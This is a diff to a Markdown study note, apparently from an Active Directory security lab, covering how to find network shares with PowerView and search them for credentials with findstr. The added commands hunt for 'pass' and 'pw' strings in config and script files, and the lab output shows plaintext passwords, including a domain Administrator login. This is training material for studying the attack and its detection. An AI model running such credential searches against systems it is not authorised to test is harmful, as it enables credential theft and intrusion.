@@ -885,7 +885,15 @@ graph LR
 3. Purposefully creates open share, forgets to close it
 4. Hidden shares ($) - misconception that they're secure
 
-### Attack
+### Attack Tools
+
+| Tool | Description |
+|------|-------------|
+| **PowerView** | Invoke-ShareFinder to enumerate shares |
+| **SauronEye** | Search multiple files for keywords |
+| **findstr** | Built-in Windows command (Living Off the Land) |
+
+**Step 1: Find shares with PowerView:**
 
 **Step 1: Find shares with PowerView:**
 
@@ -908,15 +916,37 @@ Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess
 **Step 2: Search for credentials using findstr:**
 
 ```powershell
-# Search for 'pass' in different file types
-findstr /m /s /i "pass" *.bat *.cmd *.ini *.config *.ps1
+cd \\Server01.eagle.local\dev$
 
-# Search for 'pw'
+# Search for 'pass' in different file types
+findstr /m /s /i "pass" *.bat
+findstr /m /s /i "pass" *.cmd
+findstr /m /s /i "pass" *.ini
+# Output: setup.ini
+
+findstr /m /s /i "pass" *.config
+# Output: 4\5\4\web.config
+
+# Search for 'pw' - shows filename only
 findstr /m /s /i "pw" *.config
+# Output: 5\2\3\microsoft.config
+
+# Search for 'pw' - shows exact line
+findstr /s /i "pw" *.config
+# Output: 5\2\3\microsoft.config:pw BANANANANANANANANANANANANNAANANANANAS
 
 # Search for domain name
 findstr /m /s /i "eagle" *.ps1
+# Output: 2\4\4\Software\connect.ps1
+
+findstr /s /i "eagle" *.ps1
+# Output: 2\4\4\Software\connect.ps1:net use E: \\DC1\sharedScripts /user:eagle\Administrator Slavi123
 ```
+
+> 💡 **findstr arguments:**
+> - `/s` - search current directory and subdirectories
+> - `/i` - ignore case
+> - `/m` - show only filename (not matching line)
 
 **Results:**
 
